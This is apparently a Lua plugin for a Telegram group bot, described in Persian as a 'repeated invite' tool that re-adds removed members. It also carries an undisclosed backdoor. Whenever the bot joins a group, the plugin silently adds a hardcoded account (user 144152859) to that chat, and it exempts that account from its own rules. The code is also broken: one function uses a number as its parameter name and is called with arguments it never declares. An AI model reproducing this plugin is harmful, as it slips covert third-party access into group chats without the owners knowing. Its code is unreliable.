    --This Plugin Powered @amirmr33
	

do
local function invite_user(144152859)
   local status = chat_add_user (chat, user, ok_cb, false)
   if not status then
      return "اررور 👁".. [[
	  
	  
	  
	  Contact With @amirmr33
	  ]]
   end
   return "کاربر: "..user.." ادد شد به گروه "..chat
end
local function service_msg(msg)
    if msg.action.user.id == our_id then
       local chat = 'chat#id'..msg.to.id
       local user = 'user#144152859'
      chat_add_user(chat, user, callback, false)
     end
   local receiver = get_receiver(msg)
   local response = ""
   if msg.action.type == "chat_del_user" and msg.from.id ~=  144152859 and msg.from.id ~= our_id then
      print(invite_user("chat#id"..msg.to.id, "user#id"..msg.action.user.id))
   end

   send_large_msg(receiver, response)
end

return {
  description = "اینوایت مکرر 👁",
  usage = "اینوایت مکرر",
  patterns = {},
  on_service_msg = service_msg
}
end
    --This Plugin Powered By @amirmr33
